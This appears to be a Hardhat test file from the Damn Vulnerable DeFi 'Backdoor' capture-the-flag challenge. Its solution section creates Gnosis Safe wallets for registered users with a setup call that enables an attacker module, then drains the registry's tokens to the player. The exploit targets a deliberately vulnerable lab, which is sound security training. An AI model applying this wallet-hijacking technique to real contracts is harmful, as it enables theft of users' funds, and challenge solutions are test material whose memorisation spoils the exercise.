const { ethers } = require("hardhat");
const { expect } = require("chai");
const { FallbackProvider } = require("@ethersproject/providers");

describe("[Challenge] Backdoor", function () {
  let deployer, users, player;
  let masterCopy, walletFactory, token, walletRegistry;

  const AMOUNT_TOKENS_DISTRIBUTED = 40n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, alice, bob, charlie, david, player] = await ethers.getSigners();
    users = [alice.address, bob.address, charlie.address, david.address];

    // Deploy Gnosis Safe master copy and factory contracts
    masterCopy = await (
      await ethers.getContractFactory("GnosisSafe", deployer)
    ).deploy();
    walletFactory = await (
      await ethers.getContractFactory("GnosisSafeProxyFactory", deployer)
    ).deploy();
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();

    // Deploy the registry
    walletRegistry = await (
      await ethers.getContractFactory("WalletRegistry", deployer)
    ).deploy(masterCopy.address, walletFactory.address, token.address, users);
    expect(await walletRegistry.owner()).to.eq(deployer.address);

    for (let i = 0; i < users.length; i++) {
      // Users are registered as beneficiaries
      expect(await walletRegistry.beneficiaries(users[i])).to.be.true;

      // User cannot add beneficiaries
      await expect(
        walletRegistry
          .connect(await ethers.getSigner(users[i]))
          .addBeneficiary(users[i])
      ).to.be.revertedWithCustomError(walletRegistry, "Unauthorized");
    }

    // Transfer tokens to be distributed to the registry
    await token.transfer(walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    let abi1,
      abi2,
      abi3,
      iface1,
      iface2,
      iface3,
      initializer,
      data,
      newWallet,
      newWallets = [];
    const Backdoor = await ethers.getContractFactory("BackDoor");
    const backdoor = await Backdoor.deploy(token.address, player.address);

    const FakeMaster = await ethers.getContractFactory("FakeMaster");
    const fakeMaster = await FakeMaster.deploy();
    //Create proxies and register wallets through createProxyWithCallback();
    //And use fakeMaster as setupModule receipient to register backDoor attacker as whitelisted module;
    abi1 = [
      `function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver)`,
    ];
    iface1 = new ethers.utils.Interface(abi1);
    abi2 = [`function enableModule2(address module)`];
    iface2 = new ethers.utils.Interface(abi2);
    data = iface2.encodeFunctionData("enableModule2", [backdoor.address]);
    for (i = 0; i < users.length; i++) {
      initializer = iface1.encodeFunctionData("setup", [
        [users[i]],
        1,
        fakeMaster.address,
        ethers.utils.arrayify(data),
        ethers.constants.AddressZero,
        ethers.constants.AddressZero,
        0,
        ethers.constants.AddressZero,
      ]);
      await walletFactory.createProxyWithCallback(
        masterCopy.address,
        initializer,
        0,
        walletRegistry.address
      );
      newWallet = await walletRegistry.wallets(users[i]);
      newWallets.push(newWallet);
      console.log(`new wallet for user ${users[i]} is at ${newWallets[i]}`);
      expect(await token.balanceOf(newWallets[i])).to.eq(10n * 10n ** 18n);
    }
    //Prepare calldata for backDoor attacker to pass to newWallets to execute;
    abi3 = ["function transfer(address to, uint256 amount)"];
    iface3 = new ethers.utils.Interface(abi3);
    data = iface3.encodeFunctionData("transfer", [
      player.address,
      ethers.utils.parseEther("10"),
    ]);
    //Execute attack from backDoor contract through signer: player
    await backdoor.connect(player).execute(newWallets, data);
    let bal = await token.balanceOf(player.address);
    console.log("Player balance is", ethers.utils.formatEther(bal));
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player must have used a single transaction
    expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);

    for (let i = 0; i < users.length; i++) {
      let wallet = await walletRegistry.wallets(users[i]);

      // User must have registered a wallet
      expect(wallet).to.not.eq(
        ethers.constants.AddressZero,
        "User did not register a wallet"
      );

      // User is no longer registered as a beneficiary
      expect(await walletRegistry.beneficiaries(users[i])).to.be.false;
    }

    // Player must own all tokens
    expect(await token.balanceOf(player.address)).to.eq(
      AMOUNT_TOKENS_DISTRIBUTED
    );
  });
});
